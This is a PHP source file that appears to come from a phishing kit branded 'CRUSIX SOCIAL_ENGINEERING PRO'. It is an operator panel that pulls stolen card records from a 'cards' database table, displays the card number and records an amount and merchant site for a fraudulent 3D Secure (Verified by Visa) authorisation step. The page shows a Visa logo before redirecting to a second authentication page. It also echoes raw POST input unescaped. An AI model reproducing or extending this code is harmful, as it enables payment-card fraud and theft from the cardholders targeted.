<?php 
session_start();

include('../settings.php');
	
if(isset($_SESSION['connected']))
{	
$_SESSION['theid'] = $_POST['lid'];
		$theid = $_SESSION['theid'];

       	if(isset($_POST['authorize']))
	{

		
		$base = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
	$stmt = $base->prepare("SELECT * FROM cards WHERE id=:theid"); 
	$stmt->bindParam(':theid',$theid);

                          
                             

                              $stmt->execute();
                              $set = $stmt->fetch();
  
                              $_SESSION['acceptedload'] = htmlspecialchars($set['acceptedload']);
                               
}


	if(!isset($_POST['envoyer']) && $_SESSION['acceptedload'] != "true")
	{



?>


<style>
	@import url('https://fonts.googleapis.com/css2?family=Arimo&display=swap');
	body{
		background-color: #111111;
		font-family: 'Arimo', sans-serif;

	}


	#informations{
		color: #006400;
		
		font-size: 15px;
	}
	#inpinfo{
		font-size: 15px;
		border-color: transparent;
		border-style: none ;
		border-radius: 5px;
		font-style: italic;
		margin-top: 15px;
		height: 25px;
	}
	#butsub
	{
		margin-top:  15px;
		background-color: black;
		border-style: none;
		width: 100px;
		height: 30px;
		border-radius: 5px;
		font-style: italic;
		cursor: crosshair;
	}

</style>

<html>	
<head>
	    <meta name="viewport" content="width=device-width"/>

	<title>CRUSIX SOCIAL_ENGINEERING PRO</title>
	</head>


	<body>
		

		
		<center><p id="informations">Numéro de carte: <?php echo $_POST['ccnum'];?></p></center>
		
		<center><p id="informations">Veuillez communiquer le montant et le site sur lequel vous souhaitez passer commande : </p></center>
		<center><img style="width: 90px;" src="https://www.laplateforme.com/cms/i?o=%2Fsites%2Fdefault%2Ffiles%2Finline-images%2F3D-secure-verified-visa_0.png"></center>
		<form action="" method="POST">
		<center><input id="inpinfo" placeholder="Montant (En €)" name="montant"></center>
		<center><input id="inpinfo" placeholder="Site" name="site"></center>
		<input type="hidden" name="lid" value="<?php echo $_POST['lid']; ?>">

		<center><button type="submit" id="butsub" name="envoyer" ><span style="color: darkgreen;">Envoyer</span></button></center>
	</form>
	</body>
	



</html>


<?php


}
else{
	
		
	

$base = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
                      $acc = $base->prepare('UPDATE cards SET acceptedload="true" WHERE id =:id');
                      $acc->bindParam(':id', $_POST['lid']);
                      $acc->execute();

                      $acc = $base->prepare('UPDATE cards SET vbvMontant=:vbvmon WHERE id =:id');
                      $acc->bindParam(':id', $_POST['lid']);
                       $acc->bindParam(':vbvmon', $_POST['montant']);
                      $acc->execute();

                      $acc = $base->prepare('UPDATE cards SET vbvSite=:vbvsite WHERE id =:id');
                      $acc->bindParam(':id', $_POST['lid']);
                       $acc->bindParam(':vbvsite', $_POST['site']);
                      $acc->execute();

                      

                      $_SESSION['acceptedload'] = "true";


                    



                  	header('Location: auth_page2.php');         
                           
  }


	



}
else{
		header('Location: index.php?error=Veuillez vous connecter');

}


	?>